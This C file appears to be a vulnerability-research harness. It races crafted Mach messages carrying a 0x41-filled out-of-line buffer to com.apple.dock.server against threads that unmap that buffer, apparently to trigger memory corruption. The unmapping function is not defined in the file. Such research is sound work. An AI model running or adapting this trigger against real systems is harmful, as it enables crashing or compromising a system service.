#include "fuzz_interface.h"
#include <stdio.h>
#include <pthread.h>
#include <sys/mman.h>

uint32_t string[] = {
  'owen',
  0x41414141,
  0x41414141,
  0x41414141,
  0x41414141,
  0x41414141,
  0x41414141,
  0x41414141,
  0x41414141,
};

int send_msg()
{
  mach_port_t mach_port = MACH_PORT_NULL;
  kern_return_t err =  get_service_from_bootstrap("com.apple.dock.server", &mach_port);

  if (err != KERN_SUCCESS || mach_port == MACH_PORT_NULL) {
    return 0;
  }
  complex_mach_msg_ool_t test_msg;
  memset(&test_msg, 0, sizeof(test_msg));
  printf("sizeof(test_msg): %zu\n", sizeof(test_msg));
  //setting up the header
  test_msg.header.msgh_bits =
      MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
  test_msg.header.msgh_size = sizeof(test_msg);
  test_msg.header.msgh_remote_port = mach_port;
  test_msg.header.msgh_local_port = mig_get_reply_port();
  test_msg.header.msgh_id = 0x178f4;

  // setting up the body
  test_msg.body.msgh_descriptor_count = 0x1;

  // setting up the OOL descriptor
  test_msg.data.address = string;
  test_msg.data.size = sizeof(string);
  test_msg.data.deallocate = FALSE;
  test_msg.data.copy = MACH_MSG_PHYSICAL_COPY;
  test_msg.data.type = MACH_MSG_OOL_DESCRIPTOR;

  //setting up the size
  test_msg.ool_size = test_msg.data.size;

  // optional: filling up the padding:
  for (size_t i = 0; i < 0xc; i++) {
    test_msg.padding[i] = 0x43;
  }

    //printf("%d\n", id);
    err = mach_msg(&test_msg.header, MACH_SEND_MSG | MACH_RCV_MSG,
      sizeof(test_msg), sizeof(test_msg),
      test_msg.header.msgh_local_port, 2000, MACH_PORT_NULL);

    if (err == KERN_SUCCESS){
      printf("test_msg.header.msgh_id = 0x178f4\n");
      printf("successfully sent the mach message\n");
    }
    else
      printf("failed to send the mach message: %s\n", mach_error_string(err));

  return 0;
}


int main()
{
  while (1) {
    pthread_t th_mach_call;
    pthread_create(&th_mach_call, NULL, send_msg, NULL);

    pthread_t th_unmap;
    pthread_create(&th_unmap,NULL,unmap_string,NULL);
  }


  //send_msg(argv[1],0x178f4);

	return 0;
}
